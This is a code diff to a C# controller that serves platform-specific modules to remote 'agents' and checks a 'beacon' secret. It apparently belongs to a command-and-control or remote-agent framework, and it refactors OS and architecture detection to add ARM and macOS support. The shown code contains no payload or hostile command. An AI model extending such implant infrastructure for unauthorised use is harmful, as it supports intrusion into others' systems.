@@ -7,6 +7,7 @@ using LibraNextgen.Common.Profiles;
 using LibraNextgen.Common.Protocol;
 using LibraNextgen.Service.Configuration;
 using LibraNextgen.Service.Profiles;
+using LibraNextgen.Service.Models;
 using LibraNextgen.Service.Services;
 
 namespace LibraNextgen.Service.Controllers;
@@ -412,7 +413,7 @@ public class AgentCommsController : ControllerBase
                         return NotFound(new { error = "agent platform unknown" });
 
                     var modulesDir = Path.Combine(BuildsDir, "modules", platform);
-                    var ext = platform.StartsWith("linux") ? "so" : "dll";
+                    var ext = BuilderBuildService.ModuleExt(platform);
                     var modulePath = Path.Combine(modulesDir, $"{name}.{ext}");
                     if (!System.IO.File.Exists(modulePath))
                     {
@@ -979,17 +980,21 @@ public class AgentCommsController : ControllerBase
         var agent = await _agentService.GetByIdAsync(agentId);
         if (agent == null) return null;
 
-        var os = agent.OsVersion ?? "";
-        var arch = agent.Arch ?? "";
-        if (os.Contains("Linux", StringComparison.OrdinalIgnoreCase))
-            return "linux-x64";
-        if (os.Contains("Windows", StringComparison.OrdinalIgnoreCase) || os.Contains("win32", StringComparison.OrdinalIgnoreCase))
-            return arch.Contains("86") && !arch.Contains("64") ? "x86" : "x64";
+        var mapped = BuildPlatforms.MapOsArch(agent.OsVersion ?? "", agent.Arch ?? "");
+        if (mapped != null) return mapped;
 
-        // Fall back to a host-based guess.
-        return OperatingSystem.IsWindows()
-            ? (arch.Contains("86") && !arch.Contains("64") ? "x86" : "x64")
-            : "linux-x64";
+        // Fall back to a host-based guess when the beacon OS string is not
+        // recognized (e.g. distros whose os-release omits the word "Linux").
+        var arch = agent.Arch ?? "";
+        var isArm = arch.Contains("aarch64", StringComparison.OrdinalIgnoreCase)
+                 || arch.Contains("arm64", StringComparison.OrdinalIgnoreCase);
+        var is86 = !isArm && arch.Contains("86", StringComparison.OrdinalIgnoreCase);
+        var is64 = arch.Contains("64", StringComparison.OrdinalIgnoreCase);
+        if (OperatingSystem.IsWindows())
+            return isArm ? BuildPlatforms.WindowsArm64 : is86 && !is64 ? BuildPlatforms.WindowsX86 : BuildPlatforms.WindowsX64;
+        if (OperatingSystem.IsMacOS())
+            return BuildPlatforms.MacArm64;
+        return isArm ? BuildPlatforms.LinuxArm64 : BuildPlatforms.LinuxX64;
     }
 
     private bool IsSecretRequired() => !string.IsNullOrWhiteSpace(_beaconSettings.Secret);
